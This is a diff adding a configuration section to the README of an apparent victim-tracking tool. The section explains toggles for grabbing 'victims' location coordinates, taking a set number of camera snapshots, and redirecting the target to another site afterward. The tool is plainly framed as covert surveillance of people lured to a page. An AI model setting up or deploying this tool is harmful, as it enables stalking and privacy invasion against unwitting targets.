@@ -24,6 +24,41 @@
  1. For seeing the victims data visit `http://localhost:5000/victims`
 ---
 
+## Configuration
+ * The `app.js` file contains `config` variable.
+```js
+var config={
+location:true,
+camera:true,
+camsnaps:4,
+redirectURL:"https://google.com"
+}
+```
+
+```js
+location:true
+//Can be true or false
+``` 
+* Set it to `true` , if you want to grab victims location coordinates.
+
+```js
+camera:true
+//Can be true or false
+``` 
+* Set it to `true` , If you want to capture images from victims camera.
+ 
+```js
+camsnaps:2
+
+``` 
+* Set the number of images you want to capture
+
+```js
+redirectURL: "https://xxxxxxx.xxx"
+```
+* The website where you want the user to be redirected after getting information.
+
+---
 
 ## Consider Donating
 *  [Paypal](https://paypal.me/SaritaChaubey/)
